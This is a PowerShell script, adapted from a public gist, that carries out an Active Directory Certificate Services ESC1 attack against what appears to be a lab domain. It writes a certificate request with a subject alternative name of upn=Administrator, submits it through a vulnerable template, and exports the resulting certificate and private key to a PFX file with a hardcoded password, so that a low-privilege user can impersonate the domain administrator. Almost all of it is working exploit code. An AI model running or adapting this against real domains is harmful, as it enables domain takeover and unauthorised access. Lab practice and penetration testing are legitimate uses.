# =============================================================
# Script for certificate request and import using CertReq and CertUtil
# Adapted for domain "ludus.domain", CA "ludus-CA", and DC "qubth-DC01-2022.ludus.domain"
#
# Originally based on the script published at:
# https://gist.github.com/Yeeb1/532c0d522ce30b8086c96989708b10fe
# =============================================================

# Set a fixed password (to avoid manual entry)
$password = "password"

# Base name for the request files (this can be a descriptive identifier)
$serverName = "admin"

# Directory where the generated files (.inf, .req, .cer, .pfx) will be stored
$certPath = "C:\Users\domainuser\Desktop\"

# FQDN of the CA server (Certification Authority)
$CAFQDN = "qubth-DC01-2022.ludus.domain"

# CA name (as configured on the server)
$CAName = "ludus-CA"

# Combine to obtain the full CA configuration, used in the CertReq -Submit command
$CAConfig = $CAFQDN + "\" + $CAName

# Full path where the certificate in PFX format (with private key) will be exported
$certFile = "C:\Users\domainuser\Desktop\cert.pfx"

# Vulnerable template to use for the request (use the COMMON NAME, not the Friendly Name)
$template = "ESC1"

# Domain in operation
$domain = "ludus.domain"

# Account to impersonate (for example, "Administrator")
$targetAccount = "Administrator"

# -----------------------------------------------------------------
# Step 1: Generate the INF file for the certificate request
# -----------------------------------------------------------------

Write-Host "Variables set. Creating INF file for certificate request..." -ForegroundColor Green

$certInf = @"
;-----------------------------------------------------------
; Certificate request configuration file
;-----------------------------------------------------------
[NewRequest]
; Define the Subject using the format "CN=domain\account"
Subject = "CN=$domain\$targetAccount"
; Allow the private key to be exportable
Exportable = TRUE
; Key specification: 1 means it will be used for digital signature
KeySpec = 1
; Key length in bits
KeyLength = 2048
; Hash algorithm to use
HashAlgorithm = sha256
; Key usage: 0xf0 enables various uses including signing and encryption
KeyUsage = 0xf0
; Request type, in this case PKCS10
RequestType = PKCS10

[Extensions]
; Add the Subject Alternative Name (SAN) extension with the desired UPN
2.5.29.17 = "{text}"
_continue_ = "upn=$targetAccount@$domain"

[RequestAttributes]
; Specify the certificate template to use
CertificateTemplate = $template
"@

# Save the INF file content to the specified path
$certInf | Out-File -FilePath "$certPath$serverName.inf" -Encoding ascii

# -----------------------------------------------------------------
# Step 2: Create the certificate request file (.req) using CertReq.exe
# -----------------------------------------------------------------

Write-Host "INF file created. Generating certificate request (.req) file..." -ForegroundColor Green

CertReq.exe -new "$certPath$serverName.inf" "$certPath$serverName.req"

# Verify that the INF and REQ files have been generated
Write-Host "Verifying that the INF and REQ files exist..." -ForegroundColor Green

$infExists = Test-Path "$certPath$serverName.inf"
$reqExists = Test-Path "$certPath$serverName.req"

if ($infExists -eq $true) {
    Write-Host "INF file generated successfully: $certPath$serverName.inf" -ForegroundColor Green
} else {
    Write-Host "Error: INF file not found. Please check your configuration." -ForegroundColor Red
    break
}
if ($reqExists -eq $true) {
    Write-Host "REQ file generated successfully: $certPath$serverName.req" -ForegroundColor Green
} else {
    Write-Host "Error: REQ file not found. Please check your configuration." -ForegroundColor Red
    break
}

# -----------------------------------------------------------------
# Step 3: Submit the request to the CA and receive the certificate (.cer)
# -----------------------------------------------------------------

Write-Host "Submitting the certificate request to the CA ($CAConfig)..." -ForegroundColor Green

CertReq.exe -Submit -config "$CAConfig" "$certPath$serverName.req" "$certPath$serverName.cer"

# -----------------------------------------------------------------
# Step 4: Import the received certificate into the user's certificate store
# -----------------------------------------------------------------

Write-Host "Importing the received certificate (.cer)..." -ForegroundColor Green

certreq.exe -accept "$certPath$serverName.cer" -user

Write-Host "Certificate imported successfully." -ForegroundColor Green

# -----------------------------------------------------------------
# Step 5: Export the certificate with the private key to a PFX file
# -----------------------------------------------------------------

Write-Host "Exporting the certificate with the private key to a PFX file..." -ForegroundColor Green

# Get the Thumbprint of the recently imported certificate (the last one in the 'My' store)
$thumbprint = Get-ChildItem Cert:\CurrentUser\My | Select-Object -Property Thumbprint -Last 1

# Export the certificate to a PFX file using CertUtil
certutil.exe -user -p $password -exportpfx My $thumbprint.Thumbprint $certFile "nochain"

Write-Host "Process completed. The PFX file is located at: $certFile" -ForegroundColor Green

# =============================================================
# End of script
# =============================================================
